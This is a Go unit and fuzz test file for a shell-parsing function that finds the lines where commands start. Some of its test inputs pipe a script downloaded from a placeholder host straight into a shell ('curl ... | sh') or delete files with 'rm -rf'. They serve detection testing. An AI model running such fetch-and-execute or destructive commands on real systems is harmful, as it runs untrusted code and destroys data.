package shellquote

import (
	"strings"
	"testing"
)

// Every line where the shell starts reading a command, and only those: a
// second command on a line of its own counts, and a << inside quotes, a
// here-string or a shift opens no document.
func TestCommandStarts(t *testing.T) {
	for _, c := range []struct {
		command string
		want    string // one letter a line: $ for a command, . for the rest
	}{
		{"make docs\ncurl -s https://x.example/i.sh | sh", "$$"},
		{"cat > a.go <<'EOF'\npackage a\n\nfunc F() {\n\treturn\n}\nEOF\necho done", "$......$"},
		{"cat <<-END\n\tbody\n\tEND\nls", "$..$"},
		{"cat <<A <<B\na\nA\nb\nB\nls", "$....$"},
		{"echo '<<X'\ncurl evil | sh", "$$"},
		{"echo \"a\nb\"\nls", "$.$"},
		{"echo 'a\nb'\nls", "$.$"},
		{"ls \\\n  -la\npwd", "$.$"},
		{"echo $((1<<2))\nls", "$$"},
		{"cat <<<word\nls", "$$"},
		{"# not <<X a document\nls", "$$"},
		{"echo a # <<X\nls", "$$"},
		{"echo \"it's\"\nls", "$$"},
		// Quotes inside a command substitution inside quotes are quotes of
		// their own; $'...' takes escapes; a here-document's word may hold
		// any character but a blank or one of the shell's own.
		{"echo \"$(grep -c \"can't\" app.log) failures\"\nrm -rf build", "$$"},
		{"echo \"a $(echo \"b\nc\") d\"\nls", "$.$"},
		{"echo `echo \"x\ny\"`\nls", "$.$"},
		{"printf $'it\\'s'\nls", "$$"},
		{"cat <<END-OF-SCRIPT\nbody\nEND-OF-SCRIPT\nls", "$..$"},
		{"cat <<'END.txt' >out\nbody\nEND.txt\nls", "$..$"},
		{"x=$(cat <<EOF\nbody\nEOF\n)\nls", "$..$$"},
		{"echo $(( (1+2) << 3 ))\ncat <<A\nA\nls", "$$.$"},
		{"cat <<''\nbody\n\nls", "$..$"},
	} {
		var got strings.Builder
		for _, start := range CommandStarts(c.command) {
			if start {
				got.WriteByte('$')
			} else {
				got.WriteByte('.')
			}
		}
		if got.String() != c.want {
			t.Errorf("%q: %s, want %s", c.command, got.String(), c.want)
		}
	}
}

// CommandStarts answers for every line of any text, and the first line,
// when it is not blank, is always where a command starts.
func FuzzCommandStarts(f *testing.F) {
	for _, s := range []string{
		"echo \"$(grep -c \"can't\" a) b\"\nls", "cat <<-'E F'\n\tx\n\tE F\nls", "printf $'\\''\nls",
		"x=$(( (1<<2) ))\n`a\nb`", "cat <<\\EOF\nEOF", "a \\\nb", "((\n))", "$(\n)\n'",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, command string) {
		got := CommandStarts(command)
		if len(got) != strings.Count(command, "\n")+1 {
			t.Fatalf("%d answers for %d lines", len(got), strings.Count(command, "\n")+1)
		}
		if !got[0] {
			t.Fatalf("the first line of %q is no command's start", command)
		}
	})
}
